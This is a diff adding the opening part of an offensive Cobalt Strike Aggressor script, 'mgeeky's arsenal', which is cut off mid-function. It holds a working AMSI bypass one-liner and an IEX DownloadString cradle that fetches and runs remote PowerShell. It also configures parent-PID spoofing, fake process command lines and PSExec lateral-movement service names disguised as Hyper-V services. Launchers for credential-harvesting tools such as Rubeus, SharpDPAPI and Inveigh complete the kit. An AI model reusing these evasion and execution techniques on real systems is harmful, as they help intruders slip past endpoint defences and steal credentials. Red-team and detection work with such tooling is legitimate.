@@ -1,0 +1,3306 @@
+#
+#   mgeeky's arsenal baked specially for your Cobalt Strike 4.0+ needs!
+#
+# A collection of my most useful goodies and enhancements for Cobalt Strike 4.0+.
+# Includes aliases, on beacon initial checkin automated actions (such as smart auto PPID), multiple
+# UI embellishes, parsing of Beacon-events data (tasked, output, input, etc), powerful hooks and alike.
+#
+#
+# 1) Customized Powershell Command & Download Cradle:
+#
+#   This script introduces several different methods for Powershell download and execution primitives, other
+#   than (Net.WebClient).DownloadString and IEX():
+#
+#       set POWERSHELL_DOWNLOAD_CRADLE {
+#           return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
+#       }
+#       [...]
+#
+#       set POWERSHELL_COMMAND {
+#       [...]
+#           return "powershell -nop -w hidden -encodedcommand $script";
+#       }
+#
+#   Aforementioned methods are heavily flagged these days by
+#   EDRs and AVs so we would prefer to avoid their use. It so happens that Cobalt Strike by default embeds them 
+#   excessively, generating lot of noise in such systems. We can tell Cobalt Strike to structure it's Powershell
+#   use patterns differently. However, some of introduced custom methods may not work. In such situations, we
+#   can always switch back to battle tested Cobalt Strike defaults by choosing "Use unsafe Powershell.." 
+#   to Always. 
+#
+#
+# 2) Goodies included:
+#
+#   - adds command 'autoppid' for automatically finding suitable PPID and setting it
+#   - adds command 'getdomain' to quickly return joined domain name
+#   - adds command 'getpid' to printout PIDs of processes matching name
+#   - adds command 'home' to change current directory to the user's home directory
+#   - adds command 'ipconfig' for listing network interfaces on the machine
+#   - adds command 'powershell-clear' for clearing the imported PowerShell script from a Beacon session
+#   - adds command 'syncall' to sync all downloaded files on demand
+#   - adds command 'whoami' for running 'run whoami /user /fo list'
+#   - enhances 'cd' command to make it restore previous path if "cd -" was issued
+#   - enhances 'rm' command to support multiple files/directories removal at once
+#
+#   - enriches 'upload' command to let us use specified target remote path in a second parameter, also it computes MD5 checksum of the uploaded file
+#   - enriches 'execute-assembly' command to look for not found assemblies in a preconfigured directory.
+#
+#   - command `shell` was overridden using environment variables in the command line, thus minimizing 
+#       process tree footprint
+#   - adds command 'psh' as an alternative for `powershell`, using `base64(xor(command))` passed to STDIN 
+#       launch strategy (thus avoiding -Encodedcommand). Added benefit is better output of 
+#       CLIXML error-messages. CAUTION: Does not work with powershell-import though!
+#
+#   - adds command 'powershell-clear' to clear imported powershell script.
+#
+#   - adds command 'stracciatella-activedirectory' to ease use of ActiveDirectory Powershell module straight from Beacon's console.
+#
+#   - adds command 'import-mailsniper' to import MailSniper.ps1
+#   - adds command 'import-powerup' to import PowerUp.ps1
+#   - adds command 'import-powerupsql' to import PowerUpSQL.ps1
+#   - adds command 'import-powerview' to import PowerView_dev.ps1
+#   - adds command 'import-thehash' to import Invoke-TheHash.ps1
+#
+#   - adds command 'launch-inveigh' to launch InveighZero in specified options
+#   - adds command 'launch-monologue' to launch Internal Monologue attack by Elad Shamir
+#   - adds command 'launch-sharpshares' to launch SharpShares by Mitch Moser
+#   - adds command 'launch-powerup' to import PowerUp.ps1 and launch Invoke-AllChecks -Verbose
+#   - adds command 'launch-rubeus' to quickly launch Rubeus assembly with default options: 'triage'
+#   - adds command 'launch-seatbelt' to quickly launch SeatBelt assembly with default options: 'all'
+#   - adds command 'launch-sharphound' to launch SharpHound ingestor assembly with default options: '-c All'
+#   - adds command 'launch-sharpup' to quickly launch SharpUp assembly
+#   - adds command 'launch-sharpdpapi' to quickly launch SharpDPAPI assembly
+#   - adds command 'launch-sharpwmi' to launch modified SharpWMI assembly able to retrieve WMI command output
+#   - adds command 'launch-watson' to quickly launch Watson assembly
+#
+#   - adds command 'kerberos-purge' to quickly purge all Kerberos tickets from Beacon's process memory
+#
+#   - adds beacon popup menu called "Arsenal" with following sub-menus:
+#       - "Job Kill" allowing to review list of running Jobs in a Beacon and select one to kill it.
+#       - "Mass Run" offering: Checkin, Jobs, Getuid, Shell, Powershell, Powerpick
+#       - "Launch": offering handy way of invoking our defined "launch-" aliases
+#
+#   - adds several auto-notes to Beacons on events such as: sleep changed, initial check-in, exit, 
+#       domain found, ppid set - that makes it handy to later keep track of such metadata
+#   - adds automated sync-all-downloaded-files to let your downloads always land to the local filesystem.
+#
+#
+# 3) When a new Beacon checks in - here's what happens:
+#       Every below behaviour is controlled via Arsenal's settings, deciding whether these actions should be run.
+#       Therefore its possible to turn all of them off.
+#
+#   0. Current working directory and domain name are printed to accomodate initial Beacon's cwd & domain 
+#       tracked values.
+#   1. autoppid alias kicks in to spoof Parent PID of Beacon's future post-ex jobs
+#   2. If "Preset argue..." option was set, we setup a predefined "argue" fake command lines for: 
+#       powershell, net, cmd
+#   3. User defined in "Beacon Initial Actions Setup" automated actions are executed.
+#   4. User defined in "Beacon Initial Actions Setup" automated argue commands are executed.
+#   5. Lastly, PowerView.ps1 will be imported using import-powerview alias.
+#
+#
+# 4) GUI improvements:
+#   
+#   - enhances event log right status bar by adding Team Server local/remote IP addresses
+#   - enhances beacon console status bar by adding current working directory information and setting 
+#       fixed-width to last-seen meter which avoids shortening-lengthening of the right status bar's length
+#   - colorizes current location in 'ls' and 'pwd' Beacon outputs
+#   - adds timestamp information to every "host called home" line.
+#   - every 15 seconds renames Beacons tabs according to configured format.
+#
+#
+# 5) Keyboard shortcuts bound:
+#
+#   - Ctrl+Tab          - next tab
+#   - Shift+Ctrl+Tab    - previous tab
+#   - Shift+Ctrl+S      - Opens script console
+#   - Ctrl+G            - Opens credentials tab
+#   - Shift+Ctrl+G      - Open script manager tab
+#   - Ctrl+H            - Opens Host file tab
+#   - Shift+Ctrl+H      - Scripted Web Delivery window (Stageless)
+#   - Ctrl+J            - Opens downloaded files tab
+#   - Ctrl+L            - Opens listener manager
+#   - Ctrl+M            - Opens site manager
+#   - Ctrl+N            - new Teamserver connection dialog
+#   - Ctrl+P            - Opens keystroke browser
+#   - Ctrl+Q            - Opens web log tab
+#   - Ctrl+U            - Opens screenshot browser
+#   - Ctrl+Y            - Opens target browser
+#
+#
+# 6) Options
+#
+#   Options control some of the decisions script make. Settings are saved & loaded from an external file.
+#   This script also serializes and saves %OPERATING_BEACONS hash containing metadata information about our 
+#   beacons. If anything goes wrong, and we lose track of that hash, we can always either reload the script
+#   to pull settings or use menu options.
+#
+#   - "On initial Beacon check-in do all the automated stuff" - controls whether we should issue all of the 
+#       automated stuff described in `When a new Beacon checks in - here's what happens` section above.
+#   - "Specify local path where to save downloaded files" - to be used by auto-sync-downloaded-files logic
+#   - "Specify local path .NET assemblies should be looked for" - to be used if execute-assembly didn't find
+#       specified assembly's name as a lookup directory, similarly to $PATH concept.
+#   - "During a manual 'syncall' what to do with already existing files?" - skip them? overwrite?
+#   - "Set this to let the script append valuable information..." - when enabled, this script will put 
+#       Beacon's metadata to it's Notes
+#   - "Fake PPID on initial Beacon check-in"
+#   - "Preset new Beacons with argue fake command lines." - when checked, will issue "argue" for typically
+#       used processes: Powershell, Cmd
+#   - "Use unsafe but stable Powershell [...] methods" - fall back on default Cobalt Strike PS download cradles.
+#       Select to Never to totally avoid them, seldom to use them at random and Always to disable custom ones.
+#   - "Enable debug output in Script Console"
+#   - "Process name to spoof as parent in PPID"
+#   - "Service name(s) to use in PSExec lateral movement" - comma-separeted list of service names to be used
+#       by Cobalt Strike when doing jump psexec/psexec64
+#
+#
+# This Aggressor script stands on the shoulder of giants and uses their splendid work:
+#   - fuzzysec:         https://github.com/FuzzySecurity/PowerShell-Suite
+#   - rasta-mouse:      https://github.com/rasta-mouse/Watson
+#   - Harmj0y & others: https://github.com/GhostPack/
+#   - Kevin Robertson:  https://github.com/Kevin-Robertson/Invoke-TheHash
+#   - nullbind:         https://github.com/NetSPI/PowerUpSQL
+#   - dafthack:         https://github.com/dafthack/MailSniper
+#   - PowerShellMafia:  https://github.com/PowerShellMafia/PowerSploit
+#   - xan7r:            https://github.com/xan7r/Misc
+#   - 0xthirteen:       https://github.com/0xthirteen/MoveKit
+#
+#
+# My other scripts that were integrated into this one (so there is no need to load them again):
+#   - cwd-in-beacon-status-bar.cna
+#   - better-upload.cna
+#   - httprequest.cna
+#   - smart-autoppid.cna
+#   - custom-powershell-hooks.cna
+#   - BeaconInitialTasks.cna
+#   - rename-beacon-tabs.cna
+#
+#
+# TODO:
+#   - argue manager available from Beacon's context menu
+#   - explore how we could leverage results from keystrokes();
+#   - add more keyboard shortcuts(e.g. openWindowsExecutableStage())
+#
+# Author:
+#   Mariusz B. / mgeeky, '19-'21
+#   <mb [at] binary-offensive.com>
+#   (https://github.com/mgeeky)
+#   v0.6
+#
+
+import java.net.URLEncoder;
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.net.HttpURLConnection;
+
+global('$savedSettingsFile %arsenal::defaults $stracciatellaAvailable %OPERATING_BEACONS $AMSI_BYPASS_ONELINER $USER_AGENT $CURRENT_DOMAIN_NAME $POWERSHELL_GET_JOINED_DOMAIN_NAME');
+
+#
+# =============================================================================
+# CONFIGURE VARIABLES TO DESIRABLE VALUES
+#
+
+
+$savedSettingsFile = script_resource("arsenal-config.conf");
+$beaconsCacheFile = script_resource("arsenal-beacons-cache.dat");
+
+
+#
+# =============================================================================
+# CONFIGURE BELOW PATHS FOR PREFERRED FILES
+#
+
+$SHARPWMI_PATH      = getFileProper(script_resource("modules"), "SharpWMI.exe");
+$SHARPHOUND_PATH    = getFileProper(script_resource("modules"), "SharpHound.exe");
+$RUBEUS_PATH        = getFileProper(script_resource("modules"), "Rubeus.exe");
+$WATSON_PATH        = getFileProper(script_resource("modules"), "Watson.exe");
+$SEATBELT_PATH      = getFileProper(script_resource("modules"), "Seatbelt.exe");
+$SHARPUP_PATH       = getFileProper(script_resource("modules"), "SharpUp.exe");
+$SHARPDPAPI_PATH    = getFileProper(script_resource("modules"), "SharpDPAPI.exe");
+$INTRNL_MONOLG_PATH = getFileProper(script_resource("modules"), "InternalMonologue.exe");
+$SHARPSHARES_PATH   = getFileProper(script_resource("modules"), "SharpShares-mitch.exe");
+$INVEIGH_PATH       = getFileProper(script_resource("modules"), "Inveigh.exe");
+
+$POWERVIEW_PATH     = getFileProper(script_resource("modules"), "PowerView_dev.ps1");
+$POWERUPSQL_PATH    = getFileProper(script_resource("modules"), "PowerUpSQL.ps1");
+$POWERUP_PATH       = getFileProper(script_resource("modules"), "PowerUp.ps1");
+$MAILSNIPER_PATH    = getFileProper(script_resource("modules"), "MailSniper.ps1");
+$INVOKE_THEHASH_PATH = getFileProper(script_resource("modules"), "InvokeTheHash.ps1");
+$LOAD_ADPSMODULE    = getFileProper(script_resource("modules"), "Load-AdPsModule.ps1");
+
+
+#
+# =============================================================================
+#
+
+#
+# Format deciding how should each Beacon's tab be named, utilising beacon's metadata fields
+# Available keys (CobaltStrike 4.2):
+#   note, charset, internal , alive, session, listener, pid, lastf, computer, host, 
+#   is64, id, process, ver, last, os, barch, phint, external, port, build, pbid, arch, 
+#   user, _accent, 
+#
+%arsenal::defaults["beacon_tab_name_format"] = "B: <user>@<computer> (<pid>)";
+
+# Local path where to store Synced/Downloaded files
+%arsenal::defaults["download_files_dst_path"] = "";
+
+# Local path where assemblies should be look for if not found
+%arsenal::defaults["assemblies_storage_path"] = "";
+
+%arsenal::defaults["existing_downloaded_files_overriding"] = "skip";
+
+# For OPSEC reasons we should avoid use of Powershells "-EncodedCommand" parameter and "IEX()" 
+# Invoke-Expression cmdlet, as they are heavily flagged. Yet, their use is very stable and proven to 
+# work stabily across various environments and setups. This script can treat these as follows:
+#   use_unsafe_encodedcommand_and_iex = 0;      # Never use them
+#   use_unsafe_encodedcommand_and_iex = 1;      # Use them on a seldom occassion (randomly picked)
+#   use_unsafe_encodedcommand_and_iex = 2;      # Always use them
+%arsenal::defaults["use_unsafe_encodedcommand_and_iex"] = 0;
+
+# Specifies whether to preset argue fake command lines on Beacon's initial checkin.
+# This may be troublesome for some longer Powershell commands if our argue parameter was not long enough.
+%arsenal::defaults["preset_argue_fake_cmdlines"] = "true";
+
+# Debug mode
+%arsenal::defaults["show_debug_logs"] = "false";
+
+# Do all of the automated Beacon initial actions
+%arsenal::defaults["beacon_initial_actions"] = "true";
+
+# Set desirable process name which you want to become your parent. This process will be used for
+# parent PID spoofing and thus should be allowed for opening for your current process token. 
+# For low-privileged beacons:
+%arsenal::defaults["parent_process_name"] = "explorer.exe";
+
+# For privileged beacons:
+%arsenal::defaults["privileged_parent_process_name"] = "svchost.exe";
+
+# Set the service name used by jump psexec|psexec64|psexec_psh and psexec
+%arsenal::defaults["psexec_service_name"] = "vmicnetwork,vmichub,vmicmesh,vmicstage";
+
+# Use auto-ppid on initial Beacon check-in
+%arsenal::defaults["use_autoppid"] = "true";
+
+# Set true to let this script append valuable information to Beacon's notes.
+%arsenal::defaults["add_beacon_notes"] = "true";
+
+%arsenal::defaults["collect_domain_name"] = "false";
+
+%arsenal::defaults["autorun_command_on_initial_checkin1"] = "";
+%arsenal::defaults["autorun_command_on_initial_checkin2"] = "";
+%arsenal::defaults["autorun_command_on_initial_checkin3"] = "";
+%arsenal::defaults["autorun_command_on_initial_checkin4"] = "";
+%arsenal::defaults["autorun_command_on_initial_checkin5"] = "";
+%arsenal::defaults["autorun_command_on_initial_checkin6"] = "";
+
+%arsenal::defaults["custom_argue_on_initial_checkin1"] = "";
+%arsenal::defaults["custom_argue_on_initial_checkin2"] = "";
+%arsenal::defaults["custom_argue_on_initial_checkin3"] = "";
+
+
+# Specifies AMSI Bypass oneliner to be used in post-ex actions.
+$AMSI_BYPASS_ONELINER = "[Runtime.InteropServices.Marshal]::WriteByte((([Ref].Assembly.GetTypes()|?{\$_-clike'*Am*ls'}).GetFields(40)|?{\$_-clike'*xt'}).GetValue(\$null),0x5);";
+
+# This powershell oneliner will result with current domain name to which the machine is joined.
+# Print this domain name as format-list with key name being "JoinedDomainName". This will enable some automated 
+# logic to retrieve domain name and put it into Beacon's notes as metadata.
+$POWERSHELL_GET_JOINED_DOMAIN_NAME = '(Get-WmiObject Win32_ComputerSystem) | select @{l="JoinedDomainName";e={"( {0} )" -f $_.Domain}} | fl';
+
+$USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
+
+$stracciatellaAvailable = false;
+
+$CURRENT_DOMAIN_NAME = "";
+
+# Hash containing hashes per Beacon with supplemental data:
+#   {
+#      "beacon-id" : {
+#          "initial-check-in" : "Initial check-in timestamp",
+#          "exited" : "timestamp when Beacon exited",
+#          "cwd" : "last Beacon's cwd",
+#          "prev-cwd" : "last Beacon's cwd",
+#          "autoppid" : auto-set PPID,
+#          "cwd-use-ls" : 0 or 1 whether to use 'ls' output to set Beacon's CWD
+#          "domain" : "Beacon's computer domain name, if available",
+#          "jobs" : [
+#              "jid1 - pid1 - desc1",   
+#          ],
+#      }
+#   }
+%OPERATING_BEACONS = %();
+
+
+#
+# ==============================================================================
+# KEYBOARD SHORTCUTS AND OTHER DEFAULTS
+#
+
+bind Ctrl+Tab {
+    nextTab();
+}
+
+bind Shift+Ctrl+Tab {
+    previousTab();
+} 
+
+# Open the Script Console
+bind Shift+Ctrl+S {
+    openScriptConsole();
+}
+
+bind Ctrl+G {
+    openCredentialManager();
+}
+
+bind Shift+Ctrl+G {
+    openScriptManager();
+}
+
+bind Ctrl+H {
+    openHostFileDialog();
+}
+
+bind Shift+Ctrl+H {
+    openScriptedWebDialog();
+}
+
+bind Ctrl+J {
+    openDownloadBrowser();
+}
+
+bind Ctrl+L {
+    openListenerManager();
+}
+
+bind Ctrl+M {
+    openSiteManager();
+}
+
+bind Ctrl+N {
+    openConnectDialog();
+}
+
+bind Ctrl+P {
+    openKeystrokeBrowser();
+}
+
+bind Ctrl+Q {
+    openWebLog();
+}
+
+bind Ctrl+U {
+    openScreenshotBrowser();
+}
+
+bind Ctrl+Y {
+    openTargetBrowser();
+}
+
+sub arsenal::dumpShortcuts {
+    local('$msg');
+    $msg = "";
+
+    $msg .= "mgeeky's Arsenal introduced keyboard shortcut:\n";
+    $msg .= "\n";
+
+    $msg .= "   - Ctrl+Tab          - next tab\n";
+    $msg .= "   - Shift+Ctrl+Tab    - previous tab\n";
+    $msg .= "   - Shift+Ctrl+S      - Opens script console\n";
+    $msg .= "   - Ctrl+G            - Opens credentials tab\n";
+    $msg .= "   - Shift+Ctrl+G      - Open script manager tab\n";
+    $msg .= "   - Ctrl+H            - Opens Host file tab\n";
+    $msg .= "   - Shift+Ctrl+H      - Scripted Web Delivery window (Stageless)\n";
+    $msg .= "   - Ctrl+J            - Opens downloaded files tab\n";
+    $msg .= "   - Ctrl+L            - Opens listener manager\n";
+    $msg .= "   - Ctrl+M            - Opens site manager\n";
+    $msg .= "   - Ctrl+N            - new Teamserver connection dialog\n";
+    $msg .= "   - Ctrl+P            - Opens keystroke browser\n";
+    $msg .= "   - Ctrl+Q            - Opens web log tab\n";
+    $msg .= "   - Ctrl+U            - Opens screenshot browser\n";
+    $msg .= "   - Ctrl+Y            - Opens target browser\n";
+
+    $msg .= "\n";
+
+    show_message($msg);
+}
+
+sub arsenal::dumpCobaltShortcuts {
+    local('$msg');
+
+    $msg = "";
+    $msg .= "Cobalt Strike useful default keyboard shortcuts:\n";
+
+    $msg .= "   - Ctrl+F         (console)       - open find tool to search the console \n";
+    $msg .= "   - Ctrl+K         (console)       - clear the console \n";
+    $msg .= "   - Ctrl+Minus     (console)       - decrease font size \n";
+    $msg .= "   - Ctrl+Plus      (console)       - increase font size \n";
+    $msg .= "   - Ctrl+0         (console)       - reset font size \n";
+    $msg .= "   - Escape         (console)       - clear edit box \n";
+    $msg .= "   - Page Down      (console)       - scroll down half a screen \n";
+    $msg .= "   - Page Up        (console)       - scroll up half a screen \n";
+    $msg .= "   - Tab            (console)       - complete the current command (in some console types) \n";
+    $msg .= "\n";
+    $msg .= "   - Ctrl+B         (everywhere)    - send current tab to the bottom of the Cobalt Strike window \n";
+    $msg .= "   - Ctrl+D         (everywhere)    - close current tab \n";
+    $msg .= "   - Ctrl+Shift+D   (everywhere)    - close all tabs except the current tab \n";
+    $msg .= "   - Ctrl+E         (everywhere)    - empty the bottom of the Cobalt Strike window (undo Ctrl+B) \n";
+    $msg .= "   - Ctrl+I         (everywhere)    - choose a session to interact with \n";
+    $msg .= "   - Ctrl+Left      (everywhere)    - switch to previous tab \n";
+    $msg .= "   - Ctrl+O         (everywhere)    - open preferences \n";
+    $msg .= "   - Ctrl+R         (everywhere)    - Rename the current tab \n";
+    $msg .= "   - Ctrl+Right     (everywhere)    - switch to next tab \n";
+    $msg .= "   - Ctrl+T         (everywhere)    - take screenshot of current tab (result is sent to team server) \n";
+    $msg .= "   - Ctrl+Shift+T   (everywhere)    - take screenshot of Cobalt Strike (result is sent to team server) \n";
+    $msg .= "   - Ctrl+W         (everywhere)    - open current tab in its own window \n";
+    $msg .= "\n";
+    $msg .= "   - Ctrl+C         (graph)         - arrange sessions in a circle \n";
+    $msg .= "   - Ctrl+H         (graph)         - arrange sessions in a hierarchy \n";
+    $msg .= "   - Ctrl+Minus     (graph)         - zoom out \n";
+    $msg .= "   - Ctrl+P         (graph)         - save a picture of the graph display \n";
+    $msg .= "   - Ctrl+Plus      (graph)         - zoom in \n";
+    $msg .= "   - Ctrl+S         (graph)         - arrange sessions in a stack \n";
+    $msg .= "   - Ctrl+0         (graph)         - reset to default zoom-level \n";
+    $msg .= "\n";
+    $msg .= "   - Ctrl+F         (tables)        - open find tool to filter table content \n";
+    $msg .= "\n";
+    $msg .= "   - Ctrl+A         (targets)       - select all hosts \n";
+    $msg .= "   - Escape         (targets)       - clear selected hosts \n";
+
+    $msg .= "\n";
+
+    show_message($msg);
+}
+
+menubar("Arsenal", "arsenal");
+
+popup arsenal {
+
+    item "Options" {
+        arsenal::updateglobals();
+    }
+
+    item "Beacon Initial Actions Setup" {
+        arsenal::beaconInitialActionsSetup();
+    }
+
+    item "Sync all Downloaded files" {
+        arsenal::syncDownloadedFiles();
+        if(strlen(%arsenal::defaults["download_files_dst_path"]) > 0) {
+            show_message("Files synced.");
+        }
+    }
+
+    separator();
+
+    item "Arsenal's keyboard shortcuts" {
+        arsenal::dumpShortcuts();
+    }
+
+    item "Cobalt's default keyboard shortcuts" {
+        arsenal::dumpCobaltShortcuts();
+    }
+
+    separator();
+
+    item "Save Settings" {
+        putOptions();
+        show_message("Settings saved.");
+    }
+
+    item "Restore Settings" {
+        getOptions();
+        show_message("Settings restored.");
+    }
+}
+
+sub arsenal::info {
+    println("[arsenal info] " . $1);
+}
+
+sub arsenal::debug {
+    if (%arsenal::defaults["show_debug_logs"] eq "true") {
+        println("[arsenal debug] " . $1);
+    }
+}
+
+sub arsenal::beaconInitialActionsSetup {
+    local('$dialog');
+
+    $dialog = dialog("Beacon initial check-in actions", %arsenal::defaults, &arsenal::saveBeaconInitialActions);
+
+    dialog_description($dialog, "Configure what should happen when a Beacon checks-in for the first time. Its beacon-initial-checkin handler may do some automated actions to fill results at startup. All of these actions are governed by superior setting \"Enable automated actions when Beacon checks-in for the first time\" configurable in main Arsenal's settings.");
+
+    drow_checkbox($dialog, "beacon_initial_actions", "Enable automated actions (defined in this dialog) when Beacon checks-in for the first time:", "Enable initial actions");
+    drow_checkbox($dialog, "use_autoppid", "Attempt to fake PPID on initial Beacon check-in: ", "Enable fake PPID");
+    drow_checkbox($dialog, "collect_domain_name", "Run a powerpick command to collect joined domain name of breached machine:", "Collect domain name");
+
+    drow_text($dialog, "autorun_command_on_initial_checkin1", "Run this Cobalt command when Beacon checks-in for the first time (1):");
+    drow_text($dialog, "autorun_command_on_initial_checkin2", "Run this Cobalt command when Beacon checks-in for the first time (2):");
+    drow_text($dialog, "autorun_command_on_initial_checkin3", "Run this Cobalt command when Beacon checks-in for the first time (3):");
+    drow_text($dialog, "autorun_command_on_initial_checkin4", "Run this Cobalt command when Beacon checks-in for the first time (4):");
+    drow_text($dialog, "autorun_command_on_initial_checkin5", "Run this Cobalt command when Beacon checks-in for the first time (5):");
+    drow_text($dialog, "autorun_command_on_initial_checkin6", "Run this Cobalt command when Beacon checks-in for the first time (6):");
+
+    drow_checkbox($dialog, "preset_argue_fake_cmdlines", "Preset new Beacon with argue fake command lines. Uncheck this if you experience \"Real arguments are longer than fake arguments.\"", "Preset argue");
+    drow_text($dialog, "custom_argue_on_initial_checkin1", "Issue this argue command when Beacon checks-in for the first time (path args) (1):");
+    drow_text($dialog, "custom_argue_on_initial_checkin2", "Issue this argue command when Beacon checks-in for the first time (path args) (2):");
+    drow_text($dialog, "custom_argue_on_initial_checkin3", "Issue this argue command when Beacon checks-in for the first time (path args) (3):");
+
+    dbutton_action($dialog, "Update");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+
+sub arsenal::updateglobals {
+    local('$dialog');
+
+    $dialog = dialog("mgeeky's arsenal options", %arsenal::defaults, &arsenal::saveoptions);
+
+    dialog_description($dialog, "Some adjustable preferences better customizing the way script works.");
+
+    drow_checkbox($dialog, "add_beacon_notes", "Allow the script to append valuable metadata to Beacon's notes (separated from automated actions): ", "Enable");
+    drow_text($dialog, "beacon_tab_name_format", "Rename Beacon tabs according to this format (place metadata like so: <user>). Empty to not rename:");
+
+    drow_text($dialog, "download_files_dst_path", "Specify a path where to save downloaded files: ");
+    drow_text($dialog, "assemblies_storage_path", "Specify a path where .NET assemblies should be looked up if not found by execute-assembly: ");
+    drow_combobox($dialog, "existing_downloaded_files_overriding", "During manual 'syncall' what to do with already existing locally downloaded files?", @('Skip existing files', 'Rename newly synced files'));
+
+    
+    drow_combobox($dialog, "use_unsafe_encodedcommand_and_iex", "Use unsafe but stable Powershell (Net.WebClient).DownloadString and IEX() methods: ", @("Never", "Seldom", "Always"));
+    
+    drow_checkbox($dialog, "show_debug_logs", "Enable debug output in Script Console: ", "Debug");
+    drow_text($dialog, "parent_process_name", "Process name to spoof as parent in PPID (and 'autoppid' command): ");
+    drow_text($dialog, "privileged_parent_process_name", "Process name to spoof as parent in PPID in PRIVILEGED Beacons (and 'autoppid' command): ");
+    drow_text($dialog, "psexec_service_name", "Service name(s) to use in PSExec lateral movement (comma separated, will pick at random): ");
+
+    dbutton_action($dialog, "Update");
+    dialog_show($dialog);
+}
+
+sub arsenal::saveBeaconInitialActions {
+    local('%options $err @params');
+    %options = $3;
+
+    if($2 eq "Help") {
+        $err = "";
+
+        $err .= "\n\nInitial Commands design, aka beacon_task():\n";
+        $err .= "Beacon initial commands are commands that will be processed/parsed by this script and used to construct\n";
+        $err .= "a Sleep closure that will evaluate Cobalt Strike expression. For instance, a task stated like so:\n";
+        $err .= "\t beacon_task(\$bid, 'execute-assembly C:\\tools\\Rubeus.exe hash /password:test')\n";
+        $err .= "\nwill result in creating following closure:\n";
+        $err .= "\t bexecute_assembly(\$bid, 'C:\\tools\\Rubeus.exe', 'hash /password:test')\n";
+        $err .= "\nThe way that closures are generated prevents use of apostrophe (and because I was too lazy to code a workaround\n";
+        $err .= "for that). Also, the command passed to beacon_task() will be extracted up to the first whitespace-character.\n";
+        $err .= "Then such an extract is iterated through a dictionary of known Aggressor commands to translate it into Aggressor's\n";
+        $err .= "function name (execute-assembly => bexecute_assembly) and learn the expected number of parameters the function expects.\n";
+        $err .= "\nSuch an implementation is inherently prone to be outdated as when CobaltStrike adds new commands and they won't be reflected\n";
+        $err .= "in '%functions_map' dictionary defined in parseBeaconCommand(). If a command is specified that won't be found in that dictionary,\n";
+        $err .= "a fireAlias() invocation closure will be constructed instead. That would let the caller invoke user-defined aliases.\n";
+        $err .= "\n";
+
+        show_message($err);
+
+        return;
+    }
+
+    %arsenal::defaults["autorun_command_on_initial_checkin1"] = %options["autorun_command_on_initial_checkin1"];
+    %arsenal::defaults["autorun_command_on_initial_checkin2"] = %options["autorun_command_on_initial_checkin2"];
+    %arsenal::defaults["autorun_command_on_initial_checkin3"] = %options["autorun_command_on_initial_checkin3"];
+    %arsenal::defaults["autorun_command_on_initial_checkin4"] = %options["autorun_command_on_initial_checkin4"];
+    %arsenal::defaults["autorun_command_on_initial_checkin5"] = %options["autorun_command_on_initial_checkin5"];
+    %arsenal::defaults["autorun_command_on_initial_checkin6"] = %options["autorun_command_on_initial_checkin6"];
+
+    %arsenal::defaults["custom_argue_on_initial_checkin1"] = %options["custom_argue_on_initial_checkin1"];
+    %arsenal::defaults["custom_argue_on_initial_checkin2"] = %options["custom_argue_on_initial_checkin2"];
+    %arsenal::defaults["custom_argue_on_initial_checkin3"] = %options["custom_argue_on_initial_checkin3"];
+
+    %arsenal::defaults["preset_argue_fake_cmdlines"] = %options["preset_argue_fake_cmdlines"];
+    %arsenal::defaults["beacon_initial_actions"] = %options["beacon_initial_actions"];
+    %arsenal::defaults["use_autoppid"] = %options["use_autoppid"];
+    %arsenal::defaults["collect_domain_name"] = %options["collect_domain_name"];
+
+    @params = @(
+        'autorun_command_on_initial_checkin1',
+        'autorun_command_on_initial_checkin2',
+        'autorun_command_on_initial_checkin3',
+        'autorun_command_on_initial_checkin4',
+        'autorun_command_on_initial_checkin5',
+        'autorun_command_on_initial_checkin6',
+        'custom_argue_on_initial_checkin1',
+        'custom_argue_on_initial_checkin2',
+        'custom_argue_on_initial_checkin3'
+    );
+
+    $err = "";
+
+    foreach $p (@params) {
+        if(%arsenal::defaults[$p] is $null || strlen(%arsenal::defaults[$p]) == 0) {
+            continue;
+        }
+
+        if(indexOf($cmdline, "'") !is $null) {
+            $err .= "\n\n $p $+ : Specified command cannot contain apostrophe (') as it breaks arguments parser. Please modify your command.\n";
+        }
+    }
+
+    if(strlen($err) > 0) {
+        show_error($err);
+        return;
+    }
+
+    putOptions();
+    show_message("Options saved.");
+}
+
+sub arsenal::saveoptions{
+    local('%options');
+    %options = $3;
+
+    if(%options["use_unsafe_encodedcommand_and_iex"] eq "Never") {
+        %arsenal::defaults["use_unsafe_encodedcommand_and_iex"] = 0;
+    } 
+    else if (%options["use_unsafe_encodedcommand_and_iex"] eq "Seldom") {
+        %arsenal::defaults["use_unsafe_encodedcommand_and_iex"] = 1;
+    } 
+    else if (%options["use_unsafe_encodedcommand_and_iex"] eq "Always") {
+        %arsenal::defaults["use_unsafe_encodedcommand_and_iex"] = 2;
+    } 
+
+    %arsenal::defaults["parent_process_name"] = %options["parent_process_name"];
+    %arsenal::defaults["privileged_parent_process_name"] = %options["privileged_parent_process_name"];
+    %arsenal::defaults["show_debug_logs"] = %options["show_debug_logs"];
+    %arsenal::defaults["psexec_service_name"] = %options["psexec_service_name"];
+    %arsenal::defaults["beacon_tab_name_format"] = %options["beacon_tab_name_format"];
+    %arsenal::defaults["add_beacon_notes"] = %options["add_beacon_notes"];
+
+    if(%options["existing_downloaded_files_overriding"] eq "Skip existing files") {
+        %arsenal::defaults["existing_downloaded_files_overriding"] = 'skip';
+    } 
+    else if (%options["existing_downloaded_files_overriding"] eq "Rename newly synced files") {
+        %arsenal::defaults["existing_downloaded_files_overriding"] = 'rename';
+    }
+
+    if(strlen(%options["download_files_dst_path"]) > 0) {
+        if(-isDir %options["download_files_dst_path"]) {
+            %arsenal::defaults["download_files_dst_path"] = %options["download_files_dst_path"];
+            arsenal::syncDownloadedFiles("auto");
+        }
+        else {
+            show_error("Downloaded files destination directory must exists locally on the Operator's filesystem.");
+            return;
+        }
+    }
+
+    if(strlen(%options["assemblies_storage_path"]) > 0) {
+        if(-isDir %options["assemblies_storage_path"]) {
+            %arsenal::defaults["assemblies_storage_path"] = %options["assemblies_storage_path"];
+        }
+        else {
+            show_error("Assemblies lookup directory should exist locally on the Operator's filesystem.");
+            return;
+        }
+    }
+
+    putOptions();
+    show_message("Options saved.");
+}
+
+sub arsenal::killJob {
+    local('%jobs $bid @job $jid $pid $desc');
+    %jobs = $3;
+    $bid = %jobs['bid'];
